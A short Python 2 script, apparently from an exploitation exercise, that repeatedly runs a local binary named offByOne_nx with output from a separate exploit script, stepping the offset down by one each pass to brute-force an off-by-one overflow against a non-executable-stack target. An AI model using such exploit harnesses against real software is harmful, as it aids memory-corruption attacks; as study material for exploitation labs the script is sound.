#!/usr/bin/python
# coding: utf-8

import struct 
import sys
import subprocess

offset = 0
while True:
	sys.stderr.write('offset: '+str(offset)+'\n')
	arg = './offByOne_nx "`./exploit_offByOne_nx.py '+str(offset)+'`"'
	p = subprocess.Popen(arg, shell = True)
	p.communicate()
	#raw_input()
	offset -= 1